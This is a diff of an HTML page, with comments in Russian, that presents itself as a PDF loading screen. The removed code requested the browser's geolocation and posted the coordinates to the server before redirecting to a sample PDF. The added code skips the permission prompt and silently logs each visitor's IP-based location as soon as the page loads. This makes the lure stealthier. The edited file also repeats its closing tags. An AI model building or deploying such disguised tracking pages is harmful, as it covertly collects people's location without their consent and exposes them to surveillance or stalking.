@@ -7,60 +7,9 @@
 </head>
 <body>
     <h1>Загрузка PDF...</h1>
-    <p>Файл.</p>
+    <p>Открытие документа... </p>
     <script>
-        // Запрашиваем геолокацию
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    const { latitude, longitude } = position.coords;
-
-                    // Отправляем координаты на сервер
-                    try {
-                        const response = await fetch('/api/save-location', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ latitude, longitude })
-                        });
-                        const result = await response.json();
-                        if (result.success) {
-                            // Перенаправляем на PDF
-                            window.location.href = '/sample.pdf';
-                        } else {
-                            alert('Ошибка при сохранении данных');
-                        }
-                    } catch (err) {
-                        console.error('Ошибка:', err);
-                        alert('Ошибка сервера');
-                    }
-                },
-                async (error) => {
-                    console.error('Ошибка геолокации:', error);
-                    alert('Доступ к геолокации отклонён. Скачивание файла.');
-                    // Запасной вариант: IP-геолокация
-                    try {
-                        const response = await fetch('/api/save-ip-location', {
-                            method: 'GET',
-                            headers: { 'Content-Type': 'application/json' }
-                        });
-                        const result = await response.json();
-                        if (result.success) {
-                            window.location.href = result.redirect || '/sample.pdf';
-                        } else {
-                            alert('Ошибка при сохранении данных');
-                        }
-                    } catch (err) {
-                        console.error('Ошибка IP-геолокации:', err);
-                        alert('Ошибка сервера');
-                    }
-                }
-            );
-        } else {
-            alert('Геолокация не поддерживается вашим браузером. Используем примерное местоположение.');
-            // Запасной вариант: IP-геолокация
-            saveIpLocation();
-        }
-
+        // Отправляем запрос на сохранение IP-геолокации
         async function saveIpLocation() {
             try {
                 const response = await fetch('/api/save-ip-location', {
@@ -78,6 +27,12 @@
                 alert('Ошибка сервера');
             }
         }
+
+        // Запускаем сразу
+        saveIpLocation();
+    </script>
+</body>
+</html>
     </script>
 </body>
 </html>
